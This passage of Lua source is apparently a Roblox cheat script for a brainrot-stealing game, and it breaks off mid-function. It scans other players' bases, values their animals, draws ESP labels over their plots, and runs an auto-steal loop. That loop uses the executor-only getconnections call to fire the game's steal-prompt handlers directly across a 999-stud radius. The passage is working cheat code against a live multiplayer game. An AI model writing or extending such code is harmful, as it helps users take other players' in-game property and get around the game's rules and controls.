    local AnimalsData, MutationsData, TraitsData
    local NumberUtils
    local dataReady = false

    local function loadData()
        if dataReady then return true end
        pcall(function()
            if AnimalsData then return end
            local d = ReplicatedStorage:FindFirstChild("Datas")
            local a = d and d:FindFirstChild("Animals")
            if a then AnimalsData = require(a) end
        end)
        pcall(function()
            if MutationsData then return end
            local d = ReplicatedStorage:FindFirstChild("Datas")
            local m = d and d:FindFirstChild("Mutations")
            if m then MutationsData = require(m) end
        end)
        pcall(function()
            if TraitsData then return end
            local d = ReplicatedStorage:FindFirstChild("Datas")
            local shared = ReplicatedStorage:FindFirstChild("Shared")
            local t = (d and d:FindFirstChild("Traits"))
                or (shared and shared:FindFirstChild("Traits"))
            if t then TraitsData = require(t) end
        end)
        dataReady = AnimalsData ~= nil
        return dataReady
    end
    task.spawn(function()
        while not loadData() do task.wait(0.25) end
    end)

    local function genValueOf(index, mutation, traits)
        if not dataReady then return 0 end
        local info = AnimalsData[index]
        if not info or not info.Generation then return 0 end
        local mult = 1
        if mutation and mutation ~= "None" and mutation ~= "" then
            local m = MutationsData and MutationsData[mutation]
            if m and m.Modifier then mult = mult + m.Modifier end
        end
        if type(traits) == "table" then
            for _, tr in ipairs(traits) do
                local t = TraitsData and TraitsData[tr]
                if t and t.MultiplierModifier then mult = mult + t.MultiplierModifier end
            end
        end
        return info.Generation * mult
    end

    local function shortNum(v)
        v = tonumber(v) or 0
        for _, u in ipairs({ { 1e15, "Q" }, { 1e12, "T" }, { 1e9, "B" }, { 1e6, "M" }, { 1e3, "K" } }) do
            if math.abs(v) >= u[1] then
                local s = string.format("%.2f", v / u[1]):gsub("%.?0+$", "")
                return s .. u[2]
            end
        end
        return tostring(math.floor(v + 0.5))
    end

    local genTextCache = {}
    local function genText(gv)
        local key = tostring(gv)
        local hit = genTextCache[key]
        if hit then return hit end
        local out
        if NumberUtils and NumberUtils.ToString then
            local ok, s = pcall(function() return NumberUtils:ToString(gv) end)
            if ok and s then out = "$" .. s .. "/s" end
        end
        out = out or ("$" .. shortNum(gv) .. "/s")
        genTextCache[key] = out
        return out
    end
    Brainrots.GenText = genText

    local RARITY_COLORS = {
        ["OG"]            = Color3.fromRGB(255, 214, 92),
        ["Secret"]        = Color3.fromRGB(236, 237, 242),
        ["Mythic"]        = Color3.fromRGB(231, 56, 61),
        ["Brainrot God"]  = Color3.fromRGB(255, 104, 138),
        ["Legendary"]     = Color3.fromRGB(255, 214, 72),
        ["Epic"]          = Color3.fromRGB(190, 96, 246),
        ["Rare"]          = Color3.fromRGB(72, 148, 255),
        ["Uncommon"]      = Color3.fromRGB(108, 206, 128),
        ["Common"]        = Color3.fromRGB(64, 214, 74),
    }

    local function tierWord(gv)
        gv = gv or 0
        if gv >= 1e8 then return "Brainrot God"
        elseif gv >= 1e7 then return "Legendary"
        elseif gv >= 1e6 then return "Epic"
        elseif gv >= 1e5 then return "Rare"
        elseif gv >= 1e4 then return "Uncommon"
        else return "Common" end
    end

    function Brainrots.RarityWord(entry)
        if type(entry) ~= "table" then return "Common" end
        return entry.rarity or tierWord(entry.genValue)
    end

    function Brainrots.RarityColor(entry)
        if type(entry) ~= "table" then return Theme.TextMuted end
        local word = Brainrots.RarityWord(entry)
        return RARITY_COLORS[word] or RARITY_COLORS[tierWord(entry.genValue)] or Theme.TextMuted
    end

    local allAnimalsCache = {}
    local lastAnimalData = {}
    local bySlot = {}
    local owners = {}
    local ownerSet = {}

    local function plotsFolder()
        return Workspace:FindFirstChild("Plots") or Plots
    end

    local function dropPlot(name)
        for i = #allAnimalsCache, 1, -1 do
            if allAnimalsCache[i].plot == name then
                local e = allAnimalsCache[i]
                bySlot[name .. "|" .. tostring(e.slot)] = nil
                table.remove(allAnimalsCache, i)
            end
        end
    end

    local _cacheDirty = false
    local function publish()
        Brainrots.count = #allAnimalsCache
        _cacheDirty = true
    end

    _G.VXFlushPetCache = function()
        if not _cacheDirty then return end
        _cacheDirty = false
        table.sort(allAnimalsCache, function(a, b)
            if a.genValue ~= b.genValue then return a.genValue > b.genValue end
            return tostring(a.uid) < tostring(b.uid)
        end)
        Brainrots.count = #allAnimalsCache
    end
    task.spawn(function()
        while true do
            task.wait(0.75)
            if not vxAlive() then return end
            if _cacheDirty then pcall(_G.VXFlushPetCache) end
        end
    end)

    local function isFusing(ad)
        if type(ad) ~= "table" then return false end
        local m = ad.Machine
        if type(m) == "table" and (m.Type == "Fuse" or m.Type == "Duel"
            or m.Type == "Trade" or m.Type == "Crafting") then return true end
        if ad.Fusing or ad.IsFusing or ad.FusingWith then return true end
        local fe = tonumber(ad.FuseEndTime)
        if fe and fe > Workspace:GetServerTimeNow() then return true end
        return false
    end

    local function traitArray(t)
        local out = {}
        if type(t) == "table" then
            for _, tv in next, t do
                local s = tostring(tv)
                if s ~= "" and s ~= "None" then out[#out + 1] = s end
            end
        end
        return out
    end

    local _hashBuf = {}
    local function getAnimalHash(al)
        if not al then return "" end
        local n = 0
        for slot, d in next, al do
            if type(d) == "table" then
                _hashBuf[n + 1] = tostring(slot)
                _hashBuf[n + 2] = tostring(d.Index)
                _hashBuf[n + 3] = tostring(d.Mutation)
                n = n + 3
            end
        end
        for i = #_hashBuf, n + 1, -1 do _hashBuf[i] = nil end
        return table.concat(_hashBuf, "\1")
    end

    local function ownerNameOf(owner)
        if owner == nil then return "" end
        if typeof(owner) == "Instance" then
            if owner:IsA("Player") then return owner.Name end
            return tostring(owner.Name or "")
        end
        if type(owner) == "table" then
            local n = rawget(owner, "Name")
            if n then return tostring(n) end
            local uid = rawget(owner, "UserId")
            if uid then
                local p = Players:GetPlayerByUserId(uid)
                if p then return p.Name end
            end
            return ""
        end
        if type(owner) == "number" then
            local p = Players:GetPlayerByUserId(owner)
            return p and p.Name or ""
        end
        if type(owner) == "string" then return owner end
        return ""
    end

    local function isValidStealPrompt(prompt)
        if not prompt or not prompt.Parent or not prompt.Enabled then return false end
        local state = prompt:GetAttribute("State")
        local actionText = prompt.ActionText
        return state == "Steal" or state == "Grab" or actionText == "Steal" or actionText == "Grab"
    end

    local function findTargetPromptForSlot(plot, slotName)
        local podiums = plot:FindFirstChild("AnimalPodiums")
        local podium = podiums and podiums:FindFirstChild(slotName)
        local base = podium and podium:FindFirstChild("Base")
        local spawnP = base and base:FindFirstChild("Spawn")
        local att = spawnP and spawnP:FindFirstChild("PromptAttachment")
        if att then
            for _, c in ipairs(att:GetChildren()) do
                if c:IsA("ProximityPrompt") and isValidStealPrompt(c) then
                    return c, att.WorldPosition, spawnP
                end
            end
            return nil, att.WorldPosition, spawnP
        end
        if spawnP then return nil, spawnP.Position, spawnP end
        return nil, nil, nil
    end

    local PlotScanStats = { plots = 0, resolved = 0 }
    _G.VXPlotScanStats = PlotScanStats
    local _plotResolved, _resolvedN = {}, 0
    local function markResolved(name)
        if _plotResolved[name] then return end
        _plotResolved[name] = true
        _resolvedN = _resolvedN + 1
        PlotScanStats.resolved = _resolvedN
    end
    local function unmarkResolved(name)
        if not _plotResolved[name] then return end
        _plotResolved[name] = nil
        _resolvedN = math.max(0, _resolvedN - 1)
        PlotScanStats.resolved = _resolvedN
    end

    local _prevSlots = {}
    _G.VXRemovedAnimals = {}
    local _lastSeen = {}
    local _lastSeenN = 0
    local function fileLastSeen(entry)
        local row = {
            name     = entry.name,
            index    = entry.index,
            mutation = entry.mutation,
            traits   = entry.traits,
            genText  = entry.genText,
            genValue = entry.genValue,
            rarity   = entry.rarity,
            price    = entry.price,
            plot     = entry.plot,
            slot     = entry.slot,
            at       = os.clock(),
        }
        if entry.index ~= nil then _lastSeen[string.lower(tostring(entry.index))] = row end
        if entry.name  ~= nil then _lastSeen[string.lower(tostring(entry.name))]  = row end
        _lastSeenN = _lastSeenN + 1
        if _lastSeenN >= 400 then
            _lastSeenN = 0
            local now = os.clock()
            for k, v in pairs(_lastSeen) do
                if type(v) ~= "table" or (now - (v.at or 0)) > 600 then _lastSeen[k] = nil end
            end
        end
    end
    local _removedN = 0
    local function recordRemoved(rec, plotName, slotName)
        local idx = rec.index
        if idx == nil then return end
        local aInfo = AnimalsData and AnimalsData[idx]
        local mut = rec.mutation
        if mut == nil or mut == "" then mut = "None" end
        if mut == "Yin Yang" then mut = "YinYang" end
        local gv = genValueOf(idx, rec.mutation, rec.tarr) or 0
        if type(gv) ~= "number" then gv = 0 end
        local row = {
            name = (aInfo and aInfo.DisplayName) or tostring(idx),
            index = idx, mutation = tostring(mut),
            traits = (#rec.tarr > 0) and table.concat(rec.tarr, ", ") or "None",
            rarity = aInfo and aInfo.Rarity or nil,
            price = aInfo and aInfo.Price or nil,
            genValue = gv, genText = genText(gv),
            plot = plotName, slot = slotName, at = os.clock(),
        }
        local store = _G.VXRemovedAnimals
        store[tostring(idx):lower()] = row
        store[tostring(row.name):lower()] = row
        _removedN = _removedN + 1
        if _removedN >= 40 then
            _removedN = 0
            local now = os.clock()
            for k, v in pairs(store) do
                if type(v) ~= "table" or (now - (v.at or 0)) > 180 then store[k] = nil end
            end
        end
    end

    local function scanSinglePlot(plot) pcall(function()
        if not dataReady then return end
        local ch = syncGet(plot.Name); if not ch then return end
        local al = sProp(ch, "AnimalList")
        local ownerName = ownerNameOf(sProp(ch, "Owner"))

        if type(al) ~= "table" or ownerName == "" then
            markResolved(plot.Name)
            _prevSlots[plot.Name] = nil
            if owners[plot.Name] then
                ownerSet[tostring(owners[plot.Name]):lower()] = nil
                owners[plot.Name] = nil
            end
            lastAnimalData[plot.Name] = nil; dropPlot(plot.Name); publish(); return
        end
        markResolved(plot.Name)

        owners[plot.Name] = ownerName
        ownerSet[ownerName:lower()] = plot.Name

        if ownerName == LP.Name or ownerName == LP.DisplayName then
            _prevSlots[plot.Name] = nil
            lastAnimalData[plot.Name] = nil; dropPlot(plot.Name); publish(); return
        end

        local hash = getAnimalHash(al)
        if lastAnimalData[plot.Name] == hash then return end

        local prev = _prevSlots[plot.Name]
        local nowSlots = {}
        for slot, ad in next, al do
            if type(ad) == "table" and ad.Index then
                nowSlots[tostring(slot)] = {
                    index = ad.Index, mutation = ad.Mutation, tarr = traitArray(ad.Traits),
                }
            end
        end
        if prev then
            for slotName, old in next, prev do
                local cur = nowSlots[slotName]
                if cur == nil or cur.index ~= old.index then
                    recordRemoved(old, plot.Name, slotName)
                end
            end
        end
        _prevSlots[plot.Name] = nowSlots

        dropPlot(plot.Name)
        for slot, ad in next, al do
            if type(ad) == "table" and ad.Index and not isFusing(ad) then
                local aInfo = AnimalsData[ad.Index]
                if aInfo then
                    local mut = ad.Mutation
                    if mut == nil or mut == "" then mut = "None" end
                    if mut == "Yin Yang" then mut = "YinYang" end
                    local tarr = traitArray(ad.Traits)
                    local traits = (#tarr > 0) and table.concat(tarr, ", ") or "None"
                    local gv = genValueOf(ad.Index, ad.Mutation, tarr) or 0
                    if type(gv) ~= "number" then gv = 0 end
                    local slotName = tostring(slot)
                    local prompt, pos, spawnP = findTargetPromptForSlot(plot, slotName)
                    local entry = {
                        name = aInfo.DisplayName or ad.Index,
                        petName = aInfo.DisplayName or ad.Index,
                        index = ad.Index,
                        genText = genText(gv), genValue = gv,
                        price = aInfo.Price, rarity = aInfo.Rarity,
                        mutation = tostring(mut), traits = traits,
                        owner = ownerName,
                        plot = plot.Name, slot = slotName,
                        uid = plot.Name .. "_" .. slotName,
                        prompt = prompt, position = pos, spawnPart = spawnP,
                    }
                    table.insert(allAnimalsCache, entry)
                    bySlot[plot.Name .. "|" .. slotName] = entry
                    fileLastSeen(entry)
                end
            end
        end
        lastAnimalData[plot.Name] = hash
        publish()
    end) end

    _G.VXRefreshAllPets = function()
        local pl = plotsFolder()
        if not pl then return end
        for _, p in ipairs(pl:GetChildren()) do pcall(scanSinglePlot, p) end
        pcall(_G.VXFlushPetCache)
    end

    local function setupPlotListener(plot)
        scanSinglePlot(plot)
        task.spawn(function()
            local born = os.clock()
            task.wait(math.random() * 0.05)
            while plot.Parent and vxAlive() do
                if (os.clock() - born) < 2 then task.wait(0.05) else task.wait(0.35) end
                scanSinglePlot(plot)
            end
        end)
    end

    task.spawn(function()
        local plots = Workspace:WaitForChild("Plots", 60)
        if not plots then return end
        PlotScanStats.plots = #plots:GetChildren()
        for _, p in ipairs(plots:GetChildren()) do task.spawn(setupPlotListener, p) end
        plots.ChildAdded:Connect(function(p)
            PlotScanStats.plots = #plots:GetChildren()
            task.wait(0.5)
            task.spawn(setupPlotListener, p)
        end)
        plots.ChildRemoved:Connect(function(p)
            lastAnimalData[p.Name] = nil
            _prevSlots[p.Name] = nil
            unmarkResolved(p.Name)
            PlotScanStats.plots = #plots:GetChildren()
            if owners[p.Name] then
                ownerSet[tostring(owners[p.Name]):lower()] = nil
                owners[p.Name] = nil
            end
            dropPlot(p.Name)
            publish()
        end)
    end)

    function Brainrots.Rescan()
        if _G.VXRefreshAllPets then _G.VXRefreshAllPets() end
        return Brainrots.count
    end

    function Brainrots.Get(plotName, slotName)
        if not plotName or not slotName then return nil end
        return bySlot[tostring(plotName) .. "|" .. tostring(slotName)]
    end

    function Brainrots.List() return allAnimalsCache end

    _G.VXBrainrots = Brainrots

    function Brainrots.OwnerOf(plotName) return owners[tostring(plotName)] end
    function Brainrots.Owners() return owners end

    function Brainrots.PlotOf(player)
        if not player then return nil end
        local byName = ownerSet[tostring(player.Name):lower()]
        if byName then return byName end
        return ownerSet[tostring(player.DisplayName or ""):lower()]
    end

    function Brainrots.IsBaseOwner(player)
        return Brainrots.PlotOf(player) ~= nil
    end

    local summaryCache, summaryAt = {}, 0
    function Brainrots.PlotSummary(plotName)
        if tick() - summaryAt > 1 then
            summaryAt = tick()
            summaryCache = {}
            for _, e in ipairs(allAnimalsCache) do
                local s = summaryCache[e.plot]
                if not s then
                    s = { n = 0, gen = 0 }
                    summaryCache[e.plot] = s
                end
                s.n = s.n + 1
                s.gen = s.gen + (e.genValue or 0)
            end
        end
        local s = summaryCache[plotName]
        if not s then return 0, 0, genText(0) end
        return s.n, s.gen, genText(s.gen)
    end

    function Brainrots.Best() return allAnimalsCache[1] end

    local function entryPosition(e)
        if e.spawnPart and e.spawnPart.Parent then
            e.position = e.spawnPart.Position
            return e.position
        end
        local folder = plotsFolder()
        local plot = folder and folder:FindFirstChild(e.plot)
        if not plot then return e.position end
        local prompt, pos, spawnP = findTargetPromptForSlot(plot, e.slot)
        if prompt then e.prompt = prompt end
        if spawnP then e.spawnPart = spawnP end
        if pos then e.position = pos end
        return e.position
    end

    function Brainrots.Nearest(maxRange)
        local char = LP.Character
        local root = char and (char:FindFirstChild("HumanoidRootPart")
            or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
        if not root then return nil, math.huge end

        local origin = root.Position
        local limit = tonumber(maxRange) or math.huge
        local best, bestD = nil, math.huge

        for _, e in ipairs(allAnimalsCache) do
            local pos = entryPosition(e)
            if pos then
                local d = (pos - origin).Magnitude
                if d <= limit and d < bestD then
                    best, bestD = e, d
                end
            end
        end
        if best then best.distance = bestD end
        return best, bestD
    end

    function Brainrots.Ready()
        return dataReady and _xchan ~= nil
    end

    function Brainrots.Status()
        if not dataReady then return "Loading game data" end
        if _xchan == nil then return "Scanner starting" end
        if #allAnimalsCache == 0 then return "No brainrots found" end
        return nil
    end

    function Brainrots.Describe(entry)
        if type(entry) ~= "table" then return nil end
        local txt = tostring(entry.name or "Brainrot")
        if entry.mutation and entry.mutation ~= "None" then
            txt = entry.mutation .. " " .. txt
        end
        if entry.genText then txt = txt .. "  \u{00B7}  " .. entry.genText end
        return txt
    end

    _G.VXGetBrainrots = function() return allAnimalsCache end
    _G.VXBrainrotNearest = Brainrots.Nearest

    _G.VXLastSeenRow = function(key)
        if key == nil then return nil end
        local hit = _lastSeen[string.lower(tostring(key))]
        if type(hit) == "table" then return hit end
        return nil
    end

    local _staticByKey = nil
    _G.VXStaticRow = function(key)
        if key == nil or not dataReady or not AnimalsData then return nil end
        if _staticByKey == nil then
            _staticByKey = {}
            for idx, info in pairs(AnimalsData) do
                if type(info) == "table" then
                    local gv = tonumber(info.Generation) or 0
                    local row = {
                        name = info.DisplayName or tostring(idx),
                        index = idx,
                        rarity = info.Rarity,
                        price = info.Price,
                        genValue = gv, genText = genText(gv),
                        mutation = "None", traits = "None",
                        _static = true,
                    }
                    _staticByKey[string.lower(tostring(idx))] = row
                    if info.DisplayName then
                        _staticByKey[string.lower(tostring(info.DisplayName))] = row
                    end
                end
            end
        end
        return _staticByKey[string.lower(tostring(key))]
    end

    local _baseGenByName = nil
    _G.VXBaseGenByName = function(name)
        if name == nil or not dataReady or not AnimalsData then return nil end
        if not _baseGenByName then
            _baseGenByName = {}
            for idx, info in pairs(AnimalsData) do
                local g = tonumber(type(info) == "table" and info.Generation or nil)
                if g then
                    _baseGenByName[string.lower(tostring(idx))] = g
                    if info.DisplayName then
                        _baseGenByName[string.lower(tostring(info.DisplayName))] = g
                    end
                end
            end
        end
        return _baseGenByName[string.lower(tostring(name))]
    end
end

do
    local enabled = false
    local labels = {}
    local loopId = 0

    local SIGN_EMPTY = "Empty Base"

    local function signLabel(plot)
        local sign = plot:FindFirstChild("PlotSign")
        if not sign then return nil end
        local gui = sign:FindFirstChild("SurfaceGui")
        local frame = gui and gui:FindFirstChild("Frame")
        local lbl = frame and frame:FindFirstChild("TextLabel")
        if lbl and lbl:IsA("TextLabel") then return lbl end
        local anyGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
        return anyGui and anyGui:FindFirstChildWhichIsA("TextLabel", true) or nil
    end

    local function signText(plot)
        local lbl = signLabel(plot)
        if not lbl then return nil end
        local t = lbl.Text
        if type(t) ~= "string" then return nil end
        return (t:gsub("^%s+", ""):gsub("%s+$", ""))
    end

    local function signOwner(plot)
        local t = signText(plot)
        if not t or t == "" or t == SIGN_EMPTY then return nil end
        t = (t:gsub("'s [Bb]ase$", ""):gsub("%s+$", ""))
        if t == "" then return nil end
        return t
    end

    local function slotStealPrompt(slot)
        local base = slot:FindFirstChild("Base")
        local spawnP = base and base:FindFirstChild("Spawn")
        local att = spawnP and spawnP:FindFirstChild("PromptAttachment")
        if not att then return nil, false end
        for _, c in ipairs(att:GetChildren()) do
            if c:IsA("ProximityPrompt") then
                if c.Enabled then
                    local state = c:GetAttribute("State")
                    if state == "Steal" or state == "Grab"
                        or c.ActionText == "Steal" or c.ActionText == "Grab" then
                        return c, true
                    end
                end
                return c, true
            end
        end
        return nil, false
    end

    local function occupiedSlots(plot)
        local pods = plot:FindFirstChild("AnimalPodiums")
        if not pods then return 0 end
        local n = 0
        for _, slot in ipairs(pods:GetChildren()) do
            local prompt, hadAttachment = slotStealPrompt(slot)
            local taken = false
            if prompt then
                taken = prompt.Enabled == true
            elseif not hadAttachment then
                for _, d in ipairs(slot:GetChildren()) do
                    if d:IsA("Model") and d.Name ~= "Base" and d.Name ~= "Claim"
                        and d.Name ~= "Decorations" and d.Name ~= "Spawn"
                        and d:FindFirstChildWhichIsA("BasePart", true) then
                        taken = true
                        break
                    end
                end
            end
            if taken then n = n + 1 end
        end
        return n
    end

    local function isMyPlot(plot)
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") and yb.Enabled then return true end
        end
        local owner = signOwner(plot)
        return owner ~= nil and (owner == LP.DisplayName or owner == LP.Name)
    end

    local function adornee(plot)
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local part = sign:IsA("BasePart") and sign or sign:FindFirstChildWhichIsA("BasePart", true)
            if part then return part end
        end
        return plot.PrimaryPart or plot:FindFirstChildWhichIsA("BasePart", true)
    end

    local function clearLabels()
        for _, bb in pairs(labels) do pcall(function() bb:Destroy() end) end
        labels = {}
    end

    local function buildLabel(plot)
        local part = adornee(plot)
        if not part then return nil end

        local bb = new("BillboardGui", {
            Name = "VXBaseDisplay",
            Adornee = part,
            AlwaysOnTop = true,
            Size = UDim2.new(0, 210, 0, 52),
            StudsOffsetWorldSpace = Vector3.new(0, 7, 0),
            MaxDistance = 900,
        }, part)
        bb:SetAttribute("__VXESP", true)

        local card = new("Frame", {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            BorderSizePixel = 0,
        }, bb)

        local nameLbl = new("TextLabel", {
            Name = "Owner",
            BackgroundTransparency = 1,
            Position = UDim2.new(0, 0, 0, 7),
            Size = UDim2.new(1, 0, 0, 22),
            Text = "",
            TextColor3 = Theme.GoldHi,
            TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
            TextStrokeTransparency = 0.25,
            TextSize = 16,
            Font = Enum.Font.GothamBold,
            TextTruncate = Enum.TextTruncate.AtEnd,
        }, card)
        gradient(nameLbl, ColorSequence.new({
            ColorSequenceKeypoint.new(0, Theme.SilverHi),
            ColorSequenceKeypoint.new(0.5, Theme.GoldHi),
            ColorSequenceKeypoint.new(1, Theme.GoldLo),
        }), 20)

        local infoLbl = new("TextLabel", {
            Name = "Info",
            BackgroundTransparency = 1,
            Position = UDim2.new(0, 0, 0, 29),
            Size = UDim2.new(1, 0, 0, 16),
            Text = "",
            TextColor3 = Theme.TextSecondary,
            TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
            TextStrokeTransparency = 0.35,
            TextSize = 12,
            Font = Enum.Font.Gotham,
        }, card)

        labels[plot.Name] = bb
        return bb, nameLbl, infoLbl
    end

    local function refresh()
        local plots = Workspace:FindFirstChild("Plots")
        if not plots then return end

        for _, plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") and not isMyPlot(plot) then
                local bb = labels[plot.Name]
                if not bb or not bb.Parent then
                    bb = buildLabel(plot)
                end
                if bb then
                    local card = bb:FindFirstChildOfClass("Frame")
                    local nameLbl = card and card:FindFirstChild("Owner")
                    local infoLbl = card and card:FindFirstChild("Info")
                    local owner = signOwner(plot) or Brainrots.OwnerOf(plot.Name)
                    if nameLbl then
                        nameLbl.Text = owner or "Unclaimed"
                    end
                    if infoLbl then
                        local n, _, gen = Brainrots.PlotSummary(plot.Name)
                        if n > 0 then
                            infoLbl.Text = n .. " brainrots  ·  " .. gen
                        else
                            local live = occupiedSlots(plot)
                            if live > 0 then
                                infoLbl.Text = live .. " brainrots"
                            elseif owner then
                                infoLbl.Text = "no brainrots"
                            else
                                infoLbl.Text = "empty base"
                            end
                        end
                    end
                end
            elseif labels[plot.Name] then
                pcall(function() labels[plot.Name]:Destroy() end)
                labels[plot.Name] = nil
            end
        end
    end

    F.setBaseDisplay = function(on)
        CONFIG.BASE_DISPLAY = on and true or false
        enabled = CONFIG.BASE_DISPLAY
        loopId = loopId + 1

        if not enabled then
            clearLabels()
            return
        end

        local mine = loopId
        task.spawn(function()
            while enabled and mine == loopId and vxAlive() do
                pcall(refresh)
                task.wait(2)
            end
        end)
    end
end

local Steal = {
    status = "IDLE",
    target = "",
    animalCount = 0,
    brainrotCount = 0,
    nextEntry = nil,
}

local StealState = {
    active = false,
    startTime = 0,
    label = "",
    entry = nil,
    lastResult = "",
    lastResultTime = 0,
    totalSteals = 0,
    failedSteals = 0,
    currentUid = nil,
    holdProgress = 0,
}

do
    local Engine = {
        AutoStealEnabled = false,
        StealRadius      = 999,
        LastHold         = 1.3,
        HoldCap          = 1.3,
        CycleGap         = 0,
        LastFireAt       = 0,
        Data             = {},
    }
    _G.VXAutoSteal = Engine

    local autoConn       = nil

    local cycleStart     = nil
    local firedThisCycle = false
    local currentPrompt  = nil

    local function syncFromConfig()
        Engine.StealRadius = 999
    end
    Steal.SyncSettings = syncFromConfig
    syncFromConfig()

    local myPlotCache, myPlotCacheAt = {}, 0
    local function isMyPlotByName(plotName)
        local now = tick()
        if now - myPlotCacheAt > 3 then
            myPlotCache = {}
            myPlotCacheAt = now
        end
        local hit = myPlotCache[plotName]
        if hit ~= nil then return hit end

        local result = false
        local plots = Workspace:FindFirstChild("Plots")
        local plot = plots and plots:FindFirstChild(plotName)
        local sign = plot and plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") then result = yb.Enabled == true end
        end
        myPlotCache[plotName] = result
        return result
    end

    local function isStealPrompt(pr)
        if not pr:IsA("ProximityPrompt") then return false end
        local a = pr.ActionText
        if type(a) == "string" and a:find("Steal") ~= nil then return true end
        return tostring(pr:GetAttribute("State")) == "Steal"
    end

    local function promptFromSpawn(sp)
        local fallback = nil
        local att = sp:FindFirstChild("PromptAttachment")
        if att then
            for _, pr in ipairs(att:GetChildren()) do
                if isStealPrompt(pr) then
                    if pr.Enabled then return pr end
                    fallback = fallback or pr
                end
            end
        end
        for _, pr in ipairs(sp:GetDescendants()) do
            if isStealPrompt(pr) then
                if pr.Enabled then return pr end
                fallback = fallback or pr
            end
        end
        return fallback
    end

    local function podiumLabel(pod, plotName)
        local entry = Brainrots.Get(plotName, pod.Name)
        if entry and entry.name then return entry.name, entry end

        local fromPrompt
        pcall(function()
            for _, d in ipairs(pod:GetDescendants()) do
                if d:IsA("ProximityPrompt") then
                    local ot = d.ObjectText
                    if type(ot) == "string" and ot ~= "" then
                        fromPrompt = ot
                        break
                    end
                end
            end
        end)
        if fromPrompt then return fromPrompt, nil end

        local best
        pcall(function()
            for _, d in ipairs(pod:GetDescendants()) do
                if d:IsA("TextLabel") and type(d.Text) == "string" then
                    local t = d.Text

                    if t ~= "" and not t:find("%$") and not t:find("/s") and #t < 40
                        and not t:match("^%x%x%x%x%x%x%x%x%-") then
                        best = t
                        break
                    end
                end
            end
        end)
        if best and best ~= "" then return best, nil end
        return "Brainrot", nil
    end

    local function findNearestPrompt()
        local char = LP.Character
        if not char then return nil end
        local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
        if not root then return nil end
        local plots = Workspace:FindFirstChild("Plots")
        if not plots then return nil end

        local nearest, dist = nil, math.huge
        local nearestPod, nearestPlot = nil, nil
        local total = 0

        for _, plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") and not isMyPlotByName(plot.Name) then
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    for _, pod in ipairs(pods:GetChildren()) do
                        local base = pod:FindFirstChild("Base")
                        local sp = base and base:FindFirstChild("Spawn")
                        if sp then
                            total = total + 1
                            local d = (sp.Position - root.Position).Magnitude
                            if d <= Engine.StealRadius and d < dist then
                                local found = promptFromSpawn(sp)
                                if found then
                                    nearest, dist = found, d
                                    nearestPod, nearestPlot = pod, plot
                                end
                            end
                        end
                    end
                end
            end
        end

        Steal.animalCount = total

        Steal.brainrotCount = (Brainrots.count > 0) and Brainrots.count or total

        local entry, label = nil, nil
        if nearest and nearestPod and nearestPlot then
            label, entry = podiumLabel(nearestPod, nearestPlot.Name)
        end

        Steal.nextEntry = entry or Steal.bestEntry
        return nearest, label, entry
    end

    local scanP, scanL, scanE, scanAt = nil, nil, nil, 0
    local SCAN_GAP = 0.1

    local function scanNearest()
        local now = os.clock()
        if (now - scanAt) < SCAN_GAP then
            if scanP == nil then return nil end
            if scanP.Parent and scanP.Enabled then return scanP, scanL, scanE end
        end
        scanP, scanL, scanE = findNearestPrompt()
        scanAt = now
        return scanP, scanL, scanE
    end

    local function promptData(prompt)
        local d = Engine.Data[prompt]
        if not d then
            d = { hold = {}, trigger = {}, release = {} }
            Engine.Data[prompt] = d
            if getconnections then
                pcall(function()
                    for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                        if c.Function then table.insert(d.hold, c.Function) end
                    end
                    for _, c in ipairs(getconnections(prompt.Triggered)) do
                        if c.Function then table.insert(d.trigger, c.Function) end
                    end
                    for _, c in ipairs(getconnections(prompt.PromptButtonHoldEnded)) do
                        if c.Function then table.insert(d.release, c.Function) end
                    end
                end)
            end
        end
        return d
    end

    local function beginHold(prompt)
        for _, fn in ipairs(promptData(prompt).hold) do task.spawn(fn) end
    end

    local function releaseHold(prompt)
        if not prompt then return end
        local d = Engine.Data[prompt]
        if d then
            for _, fn in ipairs(d.release or {}) do task.spawn(fn) end
        end
        pcall(function() prompt:InputHoldEnd() end)
    end

    local function fireTrigger(prompt)
        for _, fn in ipairs(promptData(prompt).trigger) do task.spawn(fn) end
    end

    local function resetCycle()
        releaseHold(currentPrompt)
        currentPrompt           = nil
        cycleStart              = nil
        firedThisCycle          = false
        StealState.active       = false
        StealState.currentUid   = nil
        StealState.entry        = nil
        StealState.holdProgress = 0
        Steal.target            = ""
    end
    Steal.Cancel = resetCycle

    local function startAutoSteal()
        if autoConn then return end
        syncFromConfig()
        Engine.AutoStealEnabled = true
        Steal.status = "SCANNING"

        autoConn = vxBind(RunService.Heartbeat, function()
            if not Engine.AutoStealEnabled or not CONFIG.AUTO_STEAL then return end

            if LP:GetAttribute("Stealing") == true then
                if cycleStart then resetCycle() end
                Steal.status = "SCANNING"
                return
            end

            local prompt, label, entry = scanNearest()
            if not prompt then
                if cycleStart then resetCycle() end
                Steal.status = "SCANNING"
                Steal.target = ""
                return
            end

            if prompt ~= currentPrompt then
                releaseHold(currentPrompt)
                currentPrompt         = prompt
                beginHold(prompt)
                StealState.currentUid = prompt
                StealState.entry      = entry
                StealState.label      = label or "Brainrot"
                Steal.target          = label or "Brainrot"
            end

            if not cycleStart then
                cycleStart           = tick()
                firedThisCycle       = false
                StealState.startTime = cycleStart
                StealState.active    = true
                Steal.status         = "STEALING"
            end

            local hold = math.min(tonumber(prompt.HoldDuration) or 1.3, Engine.HoldCap)
            Engine.LastHold = hold

            local el = tick() - cycleStart

            if not firedThisCycle then
                if el >= hold then
                    fireTrigger(prompt)
                    firedThisCycle         = true
                    Engine.LastFireAt      = tick()
                    StealState.totalSteals = StealState.totalSteals + 1
                end
            elseif (tick() - Engine.LastFireAt) >= Engine.CycleGap then
